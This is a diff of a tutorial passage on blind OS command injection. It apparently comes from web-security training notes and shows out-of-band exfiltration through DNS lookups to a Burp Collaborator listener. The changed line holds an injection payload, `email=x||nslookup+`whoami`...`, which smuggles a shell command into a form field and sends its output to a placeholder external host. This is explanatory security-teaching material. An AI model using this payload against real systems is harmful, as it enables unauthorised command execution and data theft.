@@ -37,7 +37,7 @@ In modern applications, command output is rarely returned directly. We must infe
 When the environment is completely "blind" and firewalls block direct output, we use DNS/HTTP requests to exfiltrate data to an external listener (Burp Collaborator).
 
 * **Concept:** Use a command that triggers a network lookup, such as `nslookup`, `curl`, or `dig`.
-* **Exfiltration Payload:** `email=x||nslookup+whoami.BURP-COLLABORATOR-SUBDOMAIN||`
+* **Exfiltration Payload:** `email=x||nslookup+&#96;whoami&#96;.BURP-COLLABORATOR-SUBDOMAIN||`
 * **How it works:**
     1. The shell evaluates the backticks first, executing `whoami` (e.g., returning `www-data`).
     2. The command becomes `nslookup www-data.BURP-COLLABORATOR-SUBDOMAIN`.
